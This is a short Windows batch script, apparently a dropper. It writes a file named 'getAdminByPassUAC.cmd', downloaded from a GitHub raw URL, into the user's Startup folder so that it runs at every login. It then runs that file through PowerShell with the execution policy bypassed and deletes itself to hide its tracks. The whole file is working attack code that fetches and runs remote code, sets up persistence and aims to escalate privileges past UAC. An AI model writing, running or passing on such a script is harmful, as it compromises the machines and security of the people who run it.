@echo off
set "HERE=%cd%"
cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/main/getAdminByPassUAC.cmd' -OutFile 'getAdminByPassUAC.cmd'"

powershell -ExecutionPolicy Bypass -File "getAdminByPassUAC.cmd"

cd "%HERE%"
del "%~f0"
